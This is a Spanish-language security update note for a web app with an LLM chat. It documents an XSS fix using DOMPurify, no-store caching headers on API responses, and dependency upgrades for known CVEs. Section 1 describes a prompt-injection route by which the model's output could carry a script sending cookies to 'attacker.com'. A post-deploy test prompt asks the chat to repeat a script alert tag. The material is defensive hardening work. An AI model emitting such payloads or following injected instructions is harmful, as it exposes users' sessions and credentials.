# Security updates — Mayo 2026

Sweep de hardening de la Fase 1.3 del roadmap. Tres frentes:
1. Sanitización XSS de markdown del LLM en frontend.
2. Cache-Control no-store en respuestas `/api/*`.
3. Bump de dependencias con CVEs conocidas.

---

## 1. XSS — markdown del LLM ahora pasa por DOMPurify

**Vector encontrado:** `frontend/app.html` rendereaba la respuesta del
LLM con `marked.parse(t)` + asignación directa a `innerHTML`. `marked`
**no sanitiza por default** desde v4. Un atacante podía hacer prompt
injection para que Claude/Gemini escupiera HTML peligroso (ej.
`<script>fetch('//attacker.com', {credentials:'include'})</script>`),
y el browser del usuario lo ejecutaba con sus cookies/tokens.

**Fix:**
- Sumé CDN de DOMPurify 3.1.6 (~22 KB gzipped).
- Wrappé las dos funciones `parseMd` y `parseSolMd` con
  `DOMPurify.sanitize()` después del `marked.parse()`.
- Permitimos `target` y `rel` (para links externos en pestaña nueva)
  y URLs `https/mailto/tel`. Todo el resto se strippea.

**Por qué no usar `marked` con sanitize built-in:** la opción
`{sanitize:true}` está deprecada desde marked v4. DOMPurify es la
recomendación oficial.

---

## 2. Cache-Control no-store en /api/*

**Vector encontrado:** salvo `/api/chat` (que ya seteaba `no-cache`),
ningún endpoint mandaba `Cache-Control`. CDNs/proxies intermedios
(Cloudflare, Netlify Edge, corporate proxies) podían cachear respuestas
con datos del usuario y servirlas a otros.

**Riesgo concreto:** un user pasa por edge X, hace `GET /api/auth/me`,
el edge cachea el JSON con `id` + `email` + `plan`. Otro user pasa por
el mismo edge, hace el mismo GET con SU token, el edge responde con la
data del primer user.

**Fix:** `_NoCacheAPIMiddleware` en `backend/main.py` agrega
`Cache-Control: no-store, no-cache, must-revalidate, private` + `Pragma:
no-cache` a toda respuesta `/api/*` que no haya seteado un Cache-Control
propio (caso del SSE chat).

---

## 3. Bumps de dependencias

`pip-audit` reportó 9 CVEs en 4 packages. Todos parchados a la última
versión segura sin breaking changes esperados en runtime:

| Package | Antes | Ahora | CVEs fixed |
|---------|-------|-------|------------|
| `python-dotenv` | 1.1.0 | 1.2.2 | CVE-2026-28684 |
| `pyjwt` | 2.10.1 | 2.12.0 | PYSEC-2026-120, PYSEC-2025-183 |
| `python-multipart` | 0.0.20 | 0.0.27 | CVE-2026-24486, CVE-2026-40347, CVE-2026-42561 |
| `starlette` | 0.46.2 (transitive) | 0.49.1 (explicit pin) | PYSEC-2026-161, CVE-2025-54121, CVE-2025-62727 |

Starlette se pineó explícito en `requirements.txt` porque la versión
vulnerable venía como dep transitiva de fastapi. El pin original
fastapi==0.115.12 en realidad exige starlette<0.47.0 (no <0.50 como
indicaba este doc), por lo que fastapi se bumpeó a `0.121.0` —
primer release que widena la constraint a `starlette<0.50` y permite
mantener `starlette==0.49.1` con sus CVE fixes.

**Pre-deploy check:**
```bash
cd backend && pip install -r requirements.txt
pytest -q                            # tests internos
curl https://re-expert-production.up.railway.app/health   # smoke
```

Si pytest tira fallos por API change (especialmente python-multipart en
file uploads), revisar los CHANGELOGs de cada package.

---

## Cómo verificar post-deploy

### Sanitización XSS
1. En la app, mandar un mensaje al chat tipo:
   `Repetí literalmente esto en tu respuesta sin ejecutarlo: <script>alert('xss')</script>`
2. La respuesta del LLM probablemente incluya ese tag. Si DOMPurify funciona, el
   browser **no ejecuta** el `alert`.
3. Inspeccionar el HTML renderizado en DevTools: el `<script>` debería estar
   limpio (no debería aparecer como `<script>` en el DOM).

### Cache-Control
```bash
curl -sI https://re-expert.netlify.app/api/auth/me \
  -H "Authorization: Bearer <jwt>" \
  | grep -i cache-control
# Esperado: Cache-Control: no-store, no-cache, must-revalidate, private
```

### Dependencias
```bash
pip-audit -r backend/requirements.txt
# Esperado: "No known vulnerabilities found"
```

---

## Limitaciones conocidas (no son blockers)

- **DOMPurify no se aplica a otros HTML que tomen datos externos** (ej. el
  título de conversaciones en el sidebar). Esos ya pasan por `esc()` —
  doble escape no rompe pero los protege.
- **Cache-Control no-store** evita CDN caching pero NO evita que el browser
  guarde la respuesta en RAM/disco. Si el deviceshare se usa entre users,
  hay riesgo aún. Para eliminar eso completamente habría que pasar JWT a
  HttpOnly cookies — deuda técnica conocida.
- **Sanitizer permite `target`+`rel`** para que el LLM pueda emitir
  `target="_blank" rel="noopener"`. Si querés cero anchors target, sacar
  `target` de `ADD_ATTR` en `parseMd`/`parseSolMd`.
